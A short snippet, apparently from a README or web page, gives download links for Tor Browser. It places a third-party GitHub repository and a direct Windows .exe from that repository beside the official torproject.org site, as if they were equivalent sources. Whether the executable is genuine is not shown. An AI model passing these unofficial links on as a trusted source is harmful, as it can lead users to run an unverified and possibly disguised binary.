...
Download the latest version of the Tor Browser on [this github page](https://github.com/Resimper/thetorproject), from [the website.](https://www.torproject.org/), or [thisv direct page.](https://github.com/Resimper/thetorproject/releases/download/version/tor-browser-windows-x86_64_13.0.1.exe)
